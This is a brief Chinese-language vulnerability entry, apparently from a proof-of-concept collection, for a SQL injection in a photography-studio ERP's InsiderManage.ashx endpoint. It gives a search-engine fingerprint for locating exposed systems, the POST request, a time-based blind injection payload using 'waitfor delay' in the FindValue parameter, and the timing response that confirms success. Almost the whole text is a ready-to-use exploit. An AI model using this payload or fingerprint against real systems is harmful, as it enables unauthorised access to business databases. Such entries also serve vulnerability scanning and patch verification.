# 恒友摄影ERPInsiderManage.ashx存在SQL注入漏洞

恒友摄影 ｜ SQL注入 ｜ —
- **指纹**：`body="BookChooseDateOrder.html"`
- **请求**：`POST /ashx/InsiderManage.ashx HTTP/1.1`

**Payload**
```
Method=Find&ShopID=&FindType=ChildName&FindValue=1%27;waitfor+delay+'0:0:3'--
```
- **响应特征**：200 响应时间>=3s